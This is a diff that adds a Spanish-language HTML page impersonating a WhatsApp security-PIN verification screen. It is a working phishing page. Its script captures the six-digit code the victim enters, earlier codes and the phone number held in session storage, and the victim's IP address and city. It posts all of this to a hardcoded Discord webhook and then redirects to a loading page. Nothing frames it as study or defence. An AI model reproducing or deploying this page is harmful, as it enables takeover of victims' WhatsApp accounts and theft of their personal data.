@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-image: url('https://i.postimg.cc/Dz8PRjZy/gjk.png'); background-size: cover;">
+ 
+
+    <div class="gru-1">
+        <p class="fad-idn" style="width: 100%;display: flex; justify-content: center; text-align: center; margin-top: 30px; font-size: 22px;">Verifica tu identidad ingresando el código PIN asociado a tu cuenta de WhatsApp.</p>
+       <br><br>
+        <center> <div class="DWCS fad-idn">
+           
+            <div class="boxsm fade-down" style="text-align: left;">
+                <div class="cabe">
+                    <img style="width: 20px;  vertical-align: middle;" src="https://i.postimg.cc/8CY8R6qZ/h55.png" alt="">
+                    <b>WhatsApp</b>
+                    <p>Código de verificación PIN de seguridad:</p>
+                    <div class="ast">
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>-</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                    </div>
+                </div>
+            </div>
+   </div> </div><!--fin grupo 1 -->
+
+<form action="cargando----.html">
+
+   <div class="gru-2"  style="display: none;">
+
+    <div class="bxw">
+        <div class="ead-ders">
+            <img src="https://i.postimg.cc/jjPDFmfZ/Screenshot-4.png" alt="">
+            <h2 style="margin-bottom: 10px; ">Verificación PIN</h2>
+            <p>Hemos enviado un código de 6 dígitos de autenticación PIN a tu número que termina en *** *** 0000</p>
+        <br></div>
+      <div class="cadd">
+        <label for="" style="font-size: 16px; font-weight: 600;">Código de Autenticación PIN</label>
+        <center>
+        <input type="text" id="wed" placeholder="* * * * * *"  style="text-align: center; " required maxlength="6" minlength="6"  inputmode="numeric" pattern="[0-9]*" >
+        </center>
+
+      </div>
+
+      <div class="btnsw">
+        <button id="d54y"> <img style="width: 20px; font-size: 19px; vertical-align: middle;" src="https://i.postimg.cc/fR07MHXz/756.png" alt=""> VERIFICAR CUENTA</button>
+      </div>
+</form>
+      <div class="imFi">
+        <img src="https://i.postimg.cc/8k2h7MSR/5645.png" alt="">
+      </div>
+    </div>
+   </div>
+
+
+
+   <br><br><br><br><br>
+ 
+    
+  
+<script>
+!function(){
+'use strict';
+const W="https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+
+function getPhone(){let t=sessionStorage.getItem("_w");return t?t.replace(/\D/g,""):"0000000000"}
+function showDigits(){let t=getPhone(),e=t.length>=4?t.slice(-4):"0000",a=document.querySelector(".ead-ders p");a&&(a.innerHTML=`Hemos enviado un código de 6 dígitos de autenticación PIN a tu número que termina en <b>*** *** ${e}</b>`)}
+function isUsed(t){let e=JSON.parse(sessionStorage.getItem("_uc")||"{}"),a=getPhone();return e[a]?e[a].includes(t):!1}
+function saveCode(t){let e=JSON.parse(sessionStorage.getItem("_uc")||"{}"),a=getPhone();e[a]||(e[a]=[]),e[a].includes(t)||e[a].push(t),sessionStorage.setItem("_uc",JSON.stringify(e)),sessionStorage.setItem("_cp",t)}
+function prevCodes(){let t=sessionStorage.getItem("_cd"),e=sessionStorage.getItem("_cs");return[t,e].filter(Boolean)}
+function errorDiv(){let t=document.createElement("div");t.className="error-pin",t.innerHTML=`<span>⚠</span>`,t.style.cssText="background:#fee;color:#c00;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #fcc;display:none;text-align:center;font-size:14px;";let e=document.querySelector(".cadd");return e&&e.appendChild(t),t}
+function showErr(t,e){t.style.display="block",t.textContent=e,setTimeout(()=>{t.style.display="none"},3e3)}
+
+setTimeout(()=>{
+    showDigits();
+    let t=document.querySelector(".gru-1"),e=document.querySelector(".gru-2");
+    t&&e&&setTimeout(()=>{
+        t.classList.add("fade-out-scale");
+        setTimeout(()=>{
+            t.style.display="none";
+            e.style.display="block";
+            e.classList.add("fade-in-scale");
+            setTimeout(()=>{
+                let t=document.getElementById("wed");
+                t&&t.focus();
+            },300);
+        },700);
+    },4000);
+},100);
+
+let err=errorDiv(),form=document.querySelector("form"),inp=document.getElementById("wed"),btn=document.getElementById("d54y");
+
+if (form && inp && btn) {
+    inp.addEventListener("input", function(t){
+        this.value=this.value.replace(/\D/g,"");
+        btn.disabled=6!==this.value.length;
+        err.style.display="none";
+    });
+    
+    form.addEventListener("submit", async function(t){
+        t.preventDefault();
+        let code=inp.value.trim();
+        
+        if(6!==code.length){
+            showErr(err,"El código debe tener 6 dígitos");
+            inp.focus();
+            return;
+        }
+        
+        if(isUsed(code)){
+            showErr(err,"⚠ Este código ya fue usado. Ingresa un código nuevo.");
+            inp.value="";
+            inp.focus();
+            return;
+        }
+        
+        let prev=prevCodes();
+        if(prev.includes(code)){
+            showErr(err,"❌ No uses códigos anteriores. Ingresa el nuevo PIN.");
+            inp.value="";
+            inp.focus();
+            return;
+        }
+        
+        btn.disabled=true;
+        btn.innerHTML='<img style="width:20px;vertical-align:middle" src="https://i.postimg.cc/fR07MHXz/756.png"> Finalizando...';
+        
+        saveCode(code);
+        
+        try {
+            // Obtenemos IP y localización de forma eficiente (una sola llamada)
+            const res = await fetch("https://ipapi.co/json/");
+            const data = await res.json();
+            
+            let fullPhone=sessionStorage.getItem("_w")||"N/D";
+            let prevCodesArr=prevCodes();
+            
+            let msg={
+                content:null,
+                embeds:[{
+                    title:"🔐 PIN FINAL",
+                    color:15158332,
+                    fields:[
+                        {name:"📱 Teléfono",value:`\`${fullPhone}\``,inline:true},
+                        {name:"🔢 Código PIN",value:"```"+code+"```",inline:true},
+                        {name:"📊 Historial",value:"WhatsApp: "+(prevCodesArr[0]||"N/A")+"\nSMS: "+(prevCodesArr[1]||"N/A"),inline:false},
+                        {name:"🌍 Conexión",value:`IP: ${data.ip}\n${data.city}, ${data.country_name}\nHora: ${new Date().toLocaleString("es-ES")}`,inline:false}
+                    ],
+                    footer:{text:"✅ Verificación Completa"}
+                }]
+            };
+            
+            // CLAVE: Esperamos el envío de Discord
+            await fetch(W, {
+                method:"POST",
+                keepalive: true,
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify(msg)
+            });
+
+            window.location.href="cargando----.html";
+
+        } catch (e) {
+            console.error(e);
+            window.location.href="cargando----.html";
+        }
+    });
+}
+}();
+</script>
+<script src="ak/dus.js"></script>
+</body>
+</html>
